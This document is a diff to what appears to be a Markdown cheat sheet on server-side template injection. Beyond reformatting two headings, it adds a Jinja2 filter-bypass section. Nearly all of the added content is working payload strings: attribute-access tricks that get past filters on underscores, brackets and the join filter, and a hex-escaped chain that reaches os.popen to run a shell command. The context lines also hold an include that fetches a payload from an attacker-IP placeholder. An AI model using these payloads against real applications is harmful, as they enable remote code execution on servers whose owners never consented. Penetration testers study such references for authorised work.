@@ -118,7 +118,7 @@ th:text="${7*7}"
   {{ "id"|system }}
   ```
 
-### **Handlebars (JavaScript)**
+### Handlebars (JavaScript)
 #### Detecting SSTI
 ```javascript
 {{7*7}}
@@ -135,7 +135,7 @@ th:text="${7*7}"
 
 ---
 
-## **Advanced Payloads for SSTI**
+## Advanced Payloads for SSTI
 
 - **Chained Exploits in Jinja2**
   ```jinja
@@ -153,6 +153,45 @@ th:text="${7*7}"
   {{ include("http://<attacker_ip>/payload.twig") }}
   ```
 
+---
+### Jinja2 - Filter Bypass
+
+```python
+request.__class__
+request["__class__"]
+```
+
+Bypassing `_`:
+
+```python
+http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
+
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{request|attr(["_"*2,"class","_"*2]|join)}}
+{{request|attr(["__","class","__"]|join)}}
+{{request|attr("__class__")}}
+{{request.__class__}}
+```
+
+Bypassing `[` and `]`:
+
+```python
+http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
+or
+http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
+```
+
+Bypassing `|join`:
+
+```python
+http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
+```
+
+Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [@SecGus](https://twitter.com/SecGus):
+
+```python
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+```
 ---
 
 ## **Automation Tools for SSTI Testing**
